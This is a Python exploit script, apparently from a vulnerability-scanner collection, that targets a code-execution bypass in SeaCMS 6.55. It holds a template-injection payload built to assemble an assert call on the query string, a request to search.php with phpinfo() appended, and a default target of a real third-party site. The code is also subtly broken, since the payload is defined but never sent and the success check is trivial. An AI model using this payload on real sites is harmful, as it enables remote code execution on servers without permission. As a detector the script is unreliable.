#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: seacms 6.55 代码执行
referer: https://www.freebuf.com/vuls/150303.html
author: qianxiao9996
description: 海洋CMS（SEACMS）新版本V6.55补丁仍可被绕过执行任意代码
'''
import sys
import requests
import warnings

  

class v655_code_exec:
    def __init__(self, url):
        self.url = url

    def run(self):
        returnresult = ['seacms 6.55 代码执行','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }

        payload = "searchtype=5&searchword={if{searchpage:year}&year=:as{searchpage:area}}&area=s{searchpage:letter}&letter=ert{searchpage:lang}&yuyan=($_SE{searchpage:jq}&jq=RVER{searchpage:ver}&&ver=[QUERY_STRING]));/*"
        url_path = self.url + "/search.php?phpinfo();"
        try:
            result = requests.get(url_path, timeout=3,headers=headers, verify=False)
            if result.status_code == 200 and 'code' in result.text:
                returnresult[2]=  '存在'
                returnresult[1] =url_path
                return returnresult
            else:
                returnresult[2]=  '不存在'
                return returnresult
        except Exception as e:
            # print (e)
            returnresult[2]='未知'
            return returnresult


if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = v655_code_exec("http://baidu.com")
    testVuln.run()